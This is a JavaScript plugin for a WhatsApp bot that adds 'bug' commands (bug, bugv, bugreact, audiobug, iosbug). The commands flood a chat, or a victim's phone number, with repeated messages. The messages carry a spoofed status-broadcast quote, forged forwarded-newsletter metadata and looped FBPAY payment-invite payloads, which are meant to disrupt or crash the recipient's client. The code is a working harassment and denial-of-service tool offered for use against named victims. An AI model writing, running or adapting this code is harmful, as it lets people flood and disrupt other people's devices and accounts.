const { cmd, commands } = require('../command');
const config = require('../config');

const prefix = config.PREFIX; // Get the prefix from the config

// Global bug message configuration
global.xbug2 = {
    key: {
        remoteJid: 'status@broadcast',
        fromMe: false,
        participant: '0@s.whatsapp.net',
    },
    message: {
        listResponseMessage: {
            title: "Empire_X",
        },
    },
};

// Bug Command
cmd({
    pattern: "bug",
    category: "bugs",
    desc: "Sends a bug message a specified number of times.",
    filename: __filename,
}, async (conn, mek, m, { args, reply }) => {
    try {
        if (!args[0]) {
            return reply(`Use ${prefix}bug <amount>\nExample: ${prefix}bug 5`);
        }

        let amount = parseInt(args[0]) || 10;
        reply(`Please wait! Sending \`${amount}\` bug messages...`);

        for (let i = 0; i < amount; i++) {
            await conn.sendMessage(m.chat, {
                text: "Empire_X",
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363337275149306@newsletter',
                        newsletterName: "Empire_X",
                        serverMessageId: 2,
                    },
                },
            }, { quoted: global.xbug2 });
        }

        reply(`Successfully sent \`${amount}\` bug messages.`);
    } catch (e) {
        reply(`Error: ${e.message}`);
    }
});

// Bug Victim Command
cmd({
    pattern: "bugv",
    category: "bugs",
    desc: "Sends bug messages to a specific victim.",
    filename: __filename,
}, async (conn, mek, m, { args, reply }) => {
    try {
        if (!args[0]) {
            return reply(`Use ${prefix}bugv <victim_number|amount>\nExample: ${prefix}bugv 91xxxxxxxxxx|5`);
        }

        let [victim, amount] = args[0].split("|");
        amount = parseInt(amount) || 10;

        if (!victim) {
            return reply(`Use ${prefix}bugv <victim_number|amount>\nExample: ${prefix}bugv 91xxxxxxxxxx|5`);
        }

        let victimJid = victim.trim() + "@s.whatsapp.net";
        reply(`Please wait! Sending \`${amount}\` bug messages to \`${victim}\`...`);

        for (let i = 0; i < amount; i++) {
            await conn.sendMessage(victimJid, {
                text: "Empire_X",
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363337275149306@newsletter',
                        newsletterName: "Empire_X",
                        serverMessageId: 2,
                    },
                },
            }, { quoted: global.xbug2 });
        }

        reply(`Successfully sent \`${amount}\` bug messages to \`${victim}\`.`);
    } catch (e) {
        reply(`Error: ${e.message}`);
    }
});

// Bug React Command
cmd({
    pattern: "bugreact",
    category: "bugs",
    desc: "Sends a bug reaction to a quoted message.",
    filename: __filename,
}, async (conn, mek, m, { reply }) => {
    try {
        if (!m.quoted) {
            return reply(`Reply to a message with ${prefix}bugreact to send a bug reaction.`);
        }

        await conn.sendMessage(m.chat, {
            text: "Success in sending bug",
            contextInfo: {
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363337275149306@newsletter',
                    newsletterName: "Empire_X",
                    serverMessageId: 2,
                },
            },
        }, { quoted: global.xbug2 });

        await conn.sendMessage(m.chat, { react: { text: "🐛", key: m.quoted.key } });
    } catch (e) {
        reply(`Error: ${e.message}`);
    }
});

// Audio Bug Command
cmd({
    pattern: "audiobug",
    category: "bugs",
    desc: "Sends bug audio messages to the chat.",
    filename: __filename,
}, async (conn, mek, m, { args, reply }) => {
    try {
        if (!args[0]) {
            return reply(`Use ${prefix}audiobug <amount>\nExample: ${prefix}audiobug 5`);
        }

        let amount = parseInt(args[0]) || 10;
        reply(`Please wait! Sending \`${amount}\` bug audio messages...`);

        for (let i = 0; i < amount; i++) {
            let n = Math.floor(Math.random() * 150);
            let url = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound${n}.mp3`;

            await conn.sendMessage(m.chat, {
                audio: { url },
                mimetype: "audio/mpeg",
                title: `Empire_X bug audio ${n}.mp3`,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363337275149306@newsletter',
                        newsletterName: "Empire_X",
                        serverMessageId: 2,
                    },
                },
            }, { quoted: global.xbug2 });
        }

        reply(`Successfully sent \`${amount}\` bug audio messages.`);
    } catch (e) {
        reply(`Error: ${e.message}`);
    }
});

// iOS Bug Command
cmd({
    pattern: "iosbug",
    category: "bugs",
    desc: "Sends an iOS bug message to the chat.",
    filename: __filename,
}, async (conn, mek, m, { args, reply }) => {
    try {
        if (!args[0]) {
            return reply(`Use ${prefix}iosbug <amount>\nExample: ${prefix}iosbug 5`);
        }

        let amount = parseInt(args[0]) || 10;
        reply(`Please wait! Sending \`${amount}\` iOS bug messages...`);

        for (let i = 0; i < amount; i++) {
            await conn.relayMessage(m.chat, {
                paymentInviteMessage: {
                    serviceType: "FBPAY",
                    expiryTimestamp: Date.now() + 1814400000,
                },
            }, {});
        }

        reply(`Successfully sent \`${amount}\` iOS bug messages.`);
    } catch (e) {
        reply(`Error: ${e.message}`);
    }
});